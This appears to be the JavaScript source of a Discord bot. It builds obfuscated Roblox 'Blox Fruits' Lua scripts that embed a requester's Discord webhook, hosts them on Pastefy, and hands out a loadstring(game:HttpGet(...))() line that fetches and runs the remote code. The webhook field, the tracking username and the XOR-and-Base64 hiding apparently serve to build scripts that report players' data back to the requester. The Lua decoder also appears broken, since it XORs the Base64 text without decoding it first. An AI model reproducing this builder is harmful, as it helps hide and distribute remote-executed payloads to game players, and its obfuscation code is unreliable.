const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const express = require('express');
require('dotenv').config();

// ----- Web server (health check & self-ping) -----
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('Bot is alive!'));
app.listen(PORT, () => console.log(`✅ Web server running on port ${PORT}`));

// ----- Self‑ping (keep Render awake) -----
const RENDER_URL = process.env.RENDER_EXTERNAL_URL || process.env.RENDER_URL;
if (RENDER_URL) {
    console.log(`🔁 Self‑ping enabled: ${RENDER_URL}`);
    setInterval(() => axios.get(RENDER_URL).catch(() => {}), 4 * 60 * 1000);
    setTimeout(() => axios.get(RENDER_URL).catch(() => {}), 5000);
} else {
    console.log('⚠️ Self‑ping disabled – bot may sleep.');
}

// ----- Discord Bot -----
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.once('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    const command = new SlashCommandBuilder()
        .setName('script')
        .setDescription('Generate a Blox Fruits script with your webhook')
        .addStringOption(option =>
            option.setName('game')
                .setDescription('Game name (only "bloxfruits" for now)')
                .setRequired(true)
                .addChoices({ name: 'Blox Fruits', value: 'bloxfruits' }))
        .addStringOption(option =>
            option.setName('username')
                .setDescription('Your Discord username (for tracking)')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('webhook')
                .setDescription('Your Discord webhook URL')
                .setRequired(true));

    client.application.commands.create(command);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    if (interaction.commandName !== 'script') return;

    await interaction.deferReply({ ephemeral: true });

    const game = interaction.options.getString('game');
    const username = interaction.options.getString('username');
    const webhook = interaction.options.getString('webhook');

    if (game !== 'bloxfruits') {
        return interaction.editReply({ content: '❌ Only "bloxfruits" is supported right now.' });
    }
    if (!webhook.startsWith('https://discord.com/api/webhooks/')) {
        return interaction.editReply({ content: '❌ Invalid Discord webhook URL.' });
    }

    try {
        // Read template
        const templatePath = path.join(__dirname, 'template.lua');
        if (!fs.existsSync(templatePath)) {
            return interaction.editReply({ content: '❌ Template file `template.lua` not found.' });
        }
        let template = fs.readFileSync(templatePath, 'utf8');
        template = template.replace(/\{\{WEBHOOK\}\}/g, webhook);
        template = template.replace(/\{\{USERNAME\}\}/g, username);

        // Obfuscate
        const obfuscated = obfuscateScript(template);

        // ----- Upload to Pastefy (with API key) -----
        const PASTEFY_API_KEY = process.env.PASTEFY_API_KEY;
        if (!PASTEFY_API_KEY) {
            return interaction.editReply({ 
                content: '❌ PASTEFY_API_KEY not set in environment variables. Please add it.' 
            });
        }

        const pastefyRes = await axios.post(
            'https://pastefy.app/api/v2/paste',
            {
                content: obfuscated,
                encryption: false,
                expiration: 'never'
            },
            {
                timeout: 15000,
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${PASTEFY_API_KEY}`
                }
            }
        );

        // Handle different possible response formats
        let id = null;
        if (pastefyRes.data && pastefyRes.data.id) {
            id = pastefyRes.data.id;
        } else if (pastefyRes.data && pastefyRes.data.paste && pastefyRes.data.paste.id) {
            id = pastefyRes.data.paste.id;
        } else if (pastefyRes.data && pastefyRes.data.success && pastefyRes.data.paste) {
            id = pastefyRes.data.paste.id;
        }

        if (!id) {
            console.error('Pastefy response:', JSON.stringify(pastefyRes.data, null, 2));
            throw new Error('Pastefy returned no ID. Response: ' + JSON.stringify(pastefyRes.data));
        }

        const rawUrl = `https://pastefy.app/raw/${id}`;
        const loadstringLine = `loadstring(game:HttpGet("${rawUrl}"))()`;

        const embed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('✅ Script Generated')
            .setDescription(`**Game:** ${game}\n**User:** ${username}`)
            .addFields(
                { name: '📜 Loadstring', value: `\`\`\`lua\n${loadstringLine}\n\`\`\``, inline: false },
                { name: '📦 Hosted on', value: 'Pastefy (never expires)', inline: false },
                { name: '🔒 Obfuscation', value: 'XOR + Base64', inline: false }
            )
            .setTimestamp();

        await interaction.editReply({ embeds: [embed] });

    } catch (error) {
        console.error(error);
        await interaction.editReply({
            content: '❌ Failed to generate script: ' + error.message
        });
    }
});

// ----- Obfuscator (XOR + Base64) -----
function obfuscateScript(raw) {
    const key = Math.floor(Math.random() * 254) + 1;
    let xorEncoded = '';
    for (let i = 0; i < raw.length; i++) {
        xorEncoded += String.fromCharCode(raw.charCodeAt(i) ^ key);
    }
    const base64 = Buffer.from(xorEncoded, 'binary').toString('base64');
    return `-- Obfuscated with XOR + Base64
local function decode(str, key)
    local result = ""
    for i = 1, #str do
        result = result .. string.char(string.byte(str, i) ~ key)
    end
    return result
end

local encoded = "${base64}"
local key = ${key}
local decoded = decode(encoded, key)
loadstring(decoded)()
`;
}

client.login(process.env.DISCORD_TOKEN);
